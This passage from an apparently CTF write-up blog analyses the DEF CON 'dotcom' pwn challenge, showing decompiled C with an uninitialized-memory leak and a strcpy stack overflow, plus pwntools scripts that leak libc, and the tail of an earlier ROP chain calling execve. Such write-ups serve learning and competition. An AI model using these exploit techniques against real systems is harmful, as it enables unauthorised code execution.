</span></span><span style="display:flex;"><span>pay <span style="color:#f92672">+=</span> p64(libc<span style="color:#f92672">.</span>address<span style="color:#f92672">+</span><span style="color:#ae81ff">0x000000000002be51</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>pay <span style="color:#f92672">+=</span> p64(libc<span style="color:#f92672">.</span>address<span style="color:#f92672">+</span><span style="color:#ae81ff">0x000000000011f2e7</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">*</span><span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>pay <span style="color:#f92672">+=</span> p64(libc<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>execve)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(pay<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">255</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;./submitter&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvline_contains(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;LiveCTF{&#39;</span>)<span style="color:#f92672">.</span>decode()<span style="color:#f92672">.</span>strip()
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#39;Flag: </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#39;</span>, flag)
</span></span></code></pre></div><h1 id="pwn---dotcom">Pwn - dotcom</h1>
<p><a href="">Attachment</a></p>
<h2 id="source-code-overview-5">Source-code overview</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>╭─<span style="color:#f92672">[</span>nvm<span style="color:#f92672">]</span> as kyrie in ~/CTF/2024/defcon/dotcom                                                                                                                                  00:41:22
</span></span><span style="display:flex;"><span>╰──➤ tree .
</span></span><span style="display:flex;"><span>.
</span></span><span style="display:flex;"><span>├── airbag
</span></span><span style="display:flex;"><span>├── bailout
</span></span><span style="display:flex;"><span>├── Dockerfile
</span></span><span style="display:flex;"><span>├── dotcom_market
</span></span><span style="display:flex;"><span>├── libc.so.6
</span></span><span style="display:flex;"><span>├── packages.txt
</span></span><span style="display:flex;"><span>├── run_on_socket.sh
</span></span><span style="display:flex;"><span>├── seccomp.txt
</span></span><span style="display:flex;"><span>└── start.sh
</span></span></code></pre></div><p>This challenge looks like the typical notes challenge,  but there is a strong seccomp filter.</p>
<p>It begins with installing some crash handlers and also opens the flag file. So, if we can control the flow, we can easily read the flag file.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__cdecl</span> __noreturn <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setvbuf</span>(stdout, <span style="color:#ae81ff">0LL</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0LL</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">feenableexcept</span>(<span style="color:#ae81ff">13</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">install_crash_handler</span>(<span style="color:#ae81ff">11</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">install_crash_handler</span>(<span style="color:#ae81ff">6</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">install_crash_handler</span>(<span style="color:#ae81ff">5</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">install_crash_handler</span>(<span style="color:#ae81ff">8</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">install_crash_handler</span>(<span style="color:#ae81ff">4</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">install_crash_handler</span>(<span style="color:#ae81ff">7</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">install_crash_handler</span>(<span style="color:#ae81ff">2</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;/flag1.txt&#34;</span>, <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">set_permissions</span>();
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">create_new_graph</span>();
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h2 id="vulnerabilities">Vulnerabilities</h2>
<h3 id="uninitialized-memory">Uninitialized Memory</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>  m <span style="color:#f92672">=</span> (market_model_0 <span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(end <span style="color:#f92672">-</span> p <span style="color:#f92672">+</span> <span style="color:#ae81ff">49</span>);
</span></span><span style="display:flex;"><span>  has_any <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">isNaN</span>(values[<span style="color:#ae81ff">0</span>]) )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    has_any <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    m<span style="color:#f92672">-&gt;</span>supply <span style="color:#f92672">=</span> values[<span style="color:#ae81ff">0</span>];
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">isNaN</span>(values[<span style="color:#ae81ff">1</span>]) )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    has_any <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    m<span style="color:#f92672">-&gt;</span>demand <span style="color:#f92672">=</span> values[<span style="color:#ae81ff">1</span>];
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">isNaN</span>(values[<span style="color:#ae81ff">2</span>]) )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    has_any <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    m<span style="color:#f92672">-&gt;</span>income <span style="color:#f92672">=</span> <span style="color:#ae81ff">64.0</span> <span style="color:#f92672">*</span> values[<span style="color:#ae81ff">2</span>];
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">isNaN</span>(values[<span style="color:#ae81ff">3</span>]) )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    has_any <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    m<span style="color:#f92672">-&gt;</span>employment <span style="color:#f92672">=</span> <span style="color:#ae81ff">64.0</span> <span style="color:#f92672">*</span> values[<span style="color:#ae81ff">3</span>];
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">isNaN</span>(values[<span style="color:#ae81ff">4</span>]) )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    has_any <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    m<span style="color:#f92672">-&gt;</span>confidence <span style="color:#f92672">=</span> <span style="color:#ae81ff">64.0</span> <span style="color:#f92672">*</span> values[<span style="color:#ae81ff">4</span>];
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>has_any )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Error! Invalid model format, all values are NAN&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">abort</span>();
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">memcpy</span>(m<span style="color:#f92672">-&gt;</span>notes, p, note_len);
</span></span><span style="display:flex;"><span>  m<span style="color:#f92672">-&gt;</span>notes[note_len] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> ( i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x20</span>; <span style="color:#f92672">++</span>i )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>model_list[i] )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      model_list[i] <span style="color:#f92672">=</span> m;
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Loaded model #%02lu... </span><span style="color:#ae81ff">\x1B</span><span style="color:#e6db74">[30;40m@%p</span><span style="color:#ae81ff">\x1B</span><span style="color:#e6db74">[0m</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, i, m);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> m;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span></code></pre></div><p>Since the value doesn&rsquo;t overwrite when they are NaN and because after malloc, the memory isn&rsquo;t properly initialized. So we can leverage that to have a strong leak through the <code>draw_graph</code> function.</p>
<h3 id="stack-overflow">Stack overflow</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span><span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">find_abort_string</span>(<span style="color:#66d9ef">uint64_t</span> rsp_0)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> i; <span style="color:#75715e">// [rsp+14h] [rbp-3Ch]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>p; <span style="color:#75715e">// [rsp+18h] [rbp-38h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> format[<span style="color:#ae81ff">32</span>]; <span style="color:#75715e">// [rsp+20h] [rbp-30h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">uint64_t</span> rsp_0a; <span style="color:#75715e">// [rsp+40h] [rbp-10h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  rsp_0a <span style="color:#f92672">=</span> rsp_0;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">memset</span>(format, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(format));
</span></span><span style="display:flex;"><span>  p <span style="color:#f92672">=</span> (<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)rsp_0a;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> ( i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">500</span>; <span style="color:#f92672">++</span>i )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">*</span>p <span style="color:#f92672">==</span> <span style="color:#960050;background-color:#1e0010">&#39;</span>essA :)(<span style="color:#960050;background-color:#1e0010">&#39;</span> )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">strcpy</span>(format, (<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)p);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">strdup</span>(format);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">++</span>p;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0LL</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>In the crash handler, there is an obvious stack overflow when parsing the abort message cuz it uses the <code>strcpy</code> function.</p>
<p>Since strcpy terminates when it encounters a null byte, we can&rsquo;t perform a rop chain, so I will choose the following gadget to cause stack overflow again. Fortunately, the stack address remains in the RDI register.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000004025</span>A1                 mov     rax, cs:stdin_ptr
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000004025</span>A8                 mov     rdx, [rax]      ; stream
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000004025</span>AB                 mov     esi, <span style="color:#ae81ff">0</span>C8h       ; n
</span></span><span style="display:flex;"><span>.text:<span style="color:#ae81ff">00000000004025</span>B0                 call    _fgets
</span></span></code></pre></div><h2 id="trigger-the-bug">Trigger the bug</h2>
<p>First, I created 2 chunks of 0x400 size, then free 1 to make it into the unsorted bin</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>pwndbg&gt; bins
</span></span><span style="display:flex;"><span>tcachebins
</span></span><span style="display:flex;"><span>empty
</span></span><span style="display:flex;"><span>fastbins
</span></span><span style="display:flex;"><span>empty
</span></span><span style="display:flex;"><span>unsortedbin
</span></span><span style="display:flex;"><span>all: 0xca62a0 —▸ 0x791d8281ace0 <span style="color:#f92672">(</span>main_arena+96<span style="color:#f92672">)</span> ◂— 0xca62a0
</span></span><span style="display:flex;"><span>smallbins
</span></span><span style="display:flex;"><span>empty
</span></span><span style="display:flex;"><span>largebins
</span></span><span style="display:flex;"><span>empty
</span></span></code></pre></div><p>So basically, allocate again and select the module 1 to leak our libc address</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;debug&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>LOCAL:
</span></span><span style="display:flex;"><span>    io <span style="color:#f92672">=</span> process([<span style="color:#e6db74">&#39;./dotcom_market&#39;</span>])
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>GDB:
</span></span><span style="display:flex;"><span>        cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        b* free
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>        gdb<span style="color:#f92672">.</span>attach(io, cmd)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>    io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;dotcom.shellweplayaga.me&#34;</span>, <span style="color:#ae81ff">10001</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./dotcom_market&#34;</span>)
</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./libc.so.6&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">import_module</span>(model):
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;0&#39;</span>)
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;| &#39;</span>, model)    
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">trasting</span>(idx):
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;66&#39;</span>)
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, str(idx)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;| &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;aaaa&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>model <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;0|0|0|0|0|&#39;</span><span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x400</span>
</span></span><span style="display:flex;"><span>import_module(str(len(model))<span style="color:#f92672">.</span>encode()<span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;|&#39;</span><span style="color:#f92672">+</span>model)
</span></span><span style="display:flex;"><span>import_module(str(len(model))<span style="color:#f92672">.</span>encode()<span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;|&#39;</span><span style="color:#f92672">+</span>model)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>trasting(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>NaN <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>unpack(<span style="color:#e6db74">&#34;Q&#34;</span>, struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;d&#34;</span>, float(<span style="color:#e6db74">&#39;nan&#39;</span>)))[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span>print(hex(NaN))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>model <span style="color:#f92672">=</span> str(NaN)<span style="color:#f92672">.</span>encode() <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;|0|0|0|0|&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x400</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>import_module(str(len(model))<span style="color:#f92672">.</span>encode()<span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;|&#39;</span><span style="color:#f92672">+</span>model)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;r = &#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>supply <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0BFA999999999999A</span>
</span></span><span style="display:flex;"><span>leak <span style="color:#f92672">=</span> float(io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34; &#34;</span>, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)<span style="color:#f92672">.</span>decode())
</span></span><span style="display:flex;"><span>packed_value <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#39;Q&#39;</span>, supply)
</span></span><span style="display:flex;"><span>supply_coefficient <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>unpack(<span style="color:#e6db74">&#39;d&#39;</span>, packed_value)[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> u64(struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;d&#34;</span>, leak <span style="color:#f92672">/</span> supply_coefficient)) <span style="color:#f92672">&amp;</span> <span style="color:#f92672">~</span><span style="color:#ae81ff">0xfff</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x21a000</span>
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;libc &#34;</span> <span style="color:#f92672">+</span> hex(libc<span style="color:#f92672">.</span>address))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><h2 id="solve-script-4">Solve script</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#context.log_level = &#39;debug&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>LOCAL:
</span></span><span style="display:flex;"><span>    io <span style="color:#f92672">=</span> process([<span style="color:#e6db74">&#39;./dotcom_market&#39;</span>])
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>GDB:
</span></span><span style="display:flex;"><span>        cmd <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        b* crash_handler
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        &#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>        gdb<span style="color:#f92672">.</span>attach(io, cmd)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>    io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;dotcom.shellweplayaga.me&#34;</span>, <span style="color:#ae81ff">10001</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./dotcom_market&#34;</span>)
</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;/lib/x86_64-linux-gnu/libc.so.6&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">import_module</span>(model):
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;0&#39;</span>)
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;| &#39;</span>, model)    
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">trasting</span>(idx):
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;66&#39;</span>)
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, str(idx)<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;| &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;aaaa&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>model <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;0|0|0|0|0|&#39;</span><span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x400</span>
</span></span><span style="display:flex;"><span>import_module(str(len(model))<span style="color:#f92672">.</span>encode()<span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;|&#39;</span><span style="color:#f92672">+</span>model)
</span></span><span style="display:flex;"><span>import_module(str(len(model))<span style="color:#f92672">.</span>encode()<span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;|&#39;</span><span style="color:#f92672">+</span>model)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>trasting(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>NaN <span style="color:#f92672">=</span> struct<span style="color:#f92672">.</span>unpack(<span style="color:#e6db74">&#34;Q&#34;</span>, struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;d&#34;</span>, float(<span style="color:#e6db74">&#39;nan&#39;</span>)))[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span>print(hex(NaN))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>model <span style="color:#f92672">=</span> str(NaN)<span style="color:#f92672">.</span>encode() <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;|0|0|0|0|&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x400</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>import_module(str(len(model))<span style="color:#f92672">.</span>encode()<span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;|&#39;</span><span style="color:#f92672">+</span>model)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;r = &#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>leak <span style="color:#f92672">=</span> float(io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34; &#34;</span>, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)<span style="color:#f92672">.</span>decode())
</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> u64(struct<span style="color:#f92672">.</span>pack(<span style="color:#e6db74">&#34;d&#34;</span>, leak <span style="color:#f92672">*</span> (<span style="color:#f92672">-</span><span style="color:#ae81ff">20</span>))) <span style="color:#f92672">&amp;</span> <span style="color:#f92672">~</span><span style="color:#ae81ff">0xfff</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x21a000</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;libc &#34;</span> <span style="color:#f92672">+</span> hex(libc<span style="color:#f92672">.</span>address))
